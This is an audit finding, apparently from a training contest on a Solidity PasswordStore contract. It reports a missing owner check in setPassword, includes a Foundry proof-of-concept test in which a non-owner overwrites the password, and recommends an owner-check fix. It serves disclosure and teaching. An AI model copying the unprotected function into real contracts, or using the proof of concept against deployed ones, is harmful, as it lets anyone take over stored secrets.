### Severity

High Risk

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-PasswordStore/blob/main/src/PasswordStore.sol

## Summary

A user that is not the owner can set a new password when they shouldn’t be able to.

## Vulnerability Details

Line #23 specifies that `@notice This function allows only the owner to set a new password.` but

```jsx
/*
     * @notice This function allows only the owner to set a new password.
     * @param newPassword The new password to set.
     */
function setPassword(string memory newPassword) external {
        s_password = newPassword;
        emit SetNetPassword();
    }

```

`setPassword` function lacks any owner checks as shown above.
Test done to prove that a non owner user can set a new password is shown below:

```jsx
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PasswordStore} from "../src/PasswordStore.sol";
import {DeployPasswordStore} from "../script/DeployPasswordStore.s.sol";
contract PasswordStoreTest is Test {
    PasswordStore public passwordStore;
    DeployPasswordStore public deployer;
    address public owner;
    address public notOwner;

    function setUp() public {
        deployer = new DeployPasswordStore();
        passwordStore = deployer.run();
        owner = msg.sender;
        notOwner = address(0x1234565432101122);
    }
		function test_not_owner_can_set_password() public {
	        vm.startPrank(notOwner);
	        string memory expectedPassword = "notOwnerPassword";
	        passwordStore.setPassword(expectedPassword);
	        vm.stopPrank();
	        vm.startPrank(owner);
	        string memory actualPassword = passwordStore.getPassword();
	        assertEq(actualPassword, expectedPassword);
     }

```

when `forge test` is used in the terminal our test passes which shows that a user that is not the owner can set a new password.

## Impact

Only the owner of the contract should be able to set a new password 
but this vulnerability shows that anyone can set a new password and 
change the password that owner has set which defeats the purpose of this
 contract as the owner won’t be able to access the password that they 
have set.

## Tools Used

Manual review and Foundry

## Recommendations

Update the `setPassword` function with an if check as shown below:

```jsx
function setPassword(string memory newPassword) external {
        if (msg.sender != s_owner) {
            revert PasswordStore__NotOwner();
        }
				s_password = newPassword;
        emit SetNetPassword();
    }

```

### Result
Validated